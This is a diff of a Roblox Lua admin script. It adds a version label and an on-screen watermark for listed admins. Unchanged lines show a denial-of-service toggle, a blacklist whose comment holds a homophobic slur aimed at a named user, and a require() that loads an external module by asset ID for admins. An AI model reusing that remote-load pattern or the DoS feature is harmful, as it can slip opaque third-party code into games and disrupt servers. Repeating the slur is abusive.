@@ -9,6 +9,7 @@ local AdminPanel = {
 	"EnvoyOfHead",
 	"lyovka1",
 }
+local Version_of_theScript = "V1.0.1 ALPHA"
 local EnabledDoDOS = false
 local BlackList = {
 	["Vad_75"]=true, --< Vadik Pidorasik
@@ -26,6 +27,34 @@ game.Players.PlayerAdded:Connect(function(player)
 		end
 	end
 	if table.find(AdminPanel,player.Name) ~= nil then
+			local Watermark = Instance.new("ScreenGui")
+local WaterMark = Instance.new("TextLabel")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+
+--Properties:
+
+Watermark.Name = "Watermark"
+Watermark.Parent = player:WaitForChild("PlayerGui")
+Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+WaterMark.Name = "WaterMark"
+WaterMark.Parent = Watermark
+WaterMark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WaterMark.BackgroundTransparency = 1.000
+WaterMark.BorderColor3 = Color3.fromRGB(0, 0, 0)
+WaterMark.BorderSizePixel = 0
+WaterMark.Position = UDim2.new(0, 0, 0.951186121, 0)
+WaterMark.Size = UDim2.new(0.0867430419, 0, 0.0474452563, 0)
+WaterMark.Font = Enum.Font.Code
+WaterMark.LineHeight = 1.350
+WaterMark.Text = "ADM System "..Version_of_theScript
+WaterMark.TextColor3 = Color3.fromRGB(255, 255, 255)
+WaterMark.TextScaled = true
+WaterMark.TextSize = 14.000
+WaterMark.TextWrapped = true
+
+UIAspectRatioConstraint.Parent = WaterMark
+UIAspectRatioConstraint.AspectRatio = 4.077
 		require(7192763922).load(player.Name)
 
 
